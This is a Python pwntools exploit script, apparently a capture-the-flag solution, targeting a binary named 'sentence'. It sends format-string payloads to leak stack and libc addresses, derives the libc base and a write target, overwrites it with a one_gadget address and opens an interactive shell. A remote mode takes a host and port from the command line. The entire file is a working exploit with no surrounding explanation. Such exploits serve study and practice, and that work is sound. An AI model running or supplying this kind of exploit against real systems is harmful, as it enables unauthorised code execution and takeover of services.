#!/usr/bin/env python3

from pwn import *
import time

LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
gdbscript='''

'''.format(**locals())

exe = "./sentence"
context.binary = elf = ELF(exe, checksec=False)
context.log_level = 'info'
libc = ELF(LIBC)

io = start()
one_gadget = 0x50a37

io.sendlineafter(b": \n", b"%1$p %13$p")

io.recvuntil(b'Hi, ')
leaks = io.recvline().split(b' ')[:2]
leak1 = int(leaks[0][2:].decode('utf-8'),16)
leak2 = int(leaks[1][2:].decode('utf-8'),16)

overwrite_offset = leak1 + 0x2148

io.sendlineafter(b"hell:\n", str(leak2 - 0xE9), timeout=1)
io.sendlineafter(b"her: \n", str(overwrite_offset), timeout=1)

io.sendlineafter(b": \n", b"%1$p %11$p")

io.recvuntil(b'Hi, ')
leaks = io.recvline().split(b' ')[:2]
leak1 = int(leaks[0][2:].decode('utf-8'),16)
leak2 = int(leaks[1][2:].decode('utf-8'),16)
libc.address = leak2 - 0x29D90
overwrite_offset = leak1 + 0x2148

log.success(f"libc: {hex(libc.address)}")
log.success(f"overwrite: {hex(overwrite_offset)}")

io.sendline(f'{str(libc.address + one_gadget)}')
io.sendline(f'{str(overwrite_offset)}')

io.interactive()



